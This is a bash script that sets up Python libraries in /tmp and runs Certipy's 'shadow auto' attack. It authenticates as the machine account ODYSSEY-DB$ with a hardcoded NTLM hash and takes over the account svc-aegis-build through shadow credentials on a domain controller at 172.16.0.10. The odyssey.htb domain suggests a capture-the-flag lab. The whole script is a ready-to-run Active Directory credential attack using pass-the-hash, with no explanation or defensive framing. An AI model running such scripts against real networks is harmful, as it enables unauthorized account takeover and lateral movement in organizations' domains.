#!/bin/bash
HASH="71bc6be8565f0c9871070c3912b1680d"
cd /tmp
rm -rf /tmp/pylibs
mkdir -p /tmp/pylibs
for w in /tmp/adwheels/*.whl; do
  python3 -c "import zipfile,sys; zipfile.ZipFile(sys.argv[1]).extractall('/tmp/pylibs')" "$w"
done
# only remove ABI-mismatched binary packages
rm -rf /tmp/pylibs/cffi /tmp/pylibs/cffi-*.dist-info /tmp/pylibs/_cffi_backend* \
       /tmp/pylibs/cryptography /tmp/pylibs/cryptography-*.dist-info /tmp/pylibs/cryptography.libs \
       /tmp/pylibs/bcrypt /tmp/pylibs/bcrypt-*.dist-info \
       /tmp/pylibs/nacl /tmp/pylibs/PyNaCl* /tmp/pylibs/pynacl* 2>/dev/null
export PYTHONPATH=/tmp/pylibs
python3 - <<'PY'
import sys
from certipy.entry import main
sys.argv = [
  "certipy","shadow","auto",
  "-u","ODYSSEY-DB$@odyssey.htb",
  "-hashes",":71bc6be8565f0c9871070c3912b1680d",
  "-account","svc-aegis-build",
  "-dc-ip","172.16.0.10",
]
main()
PY
echo SHADOW6_END
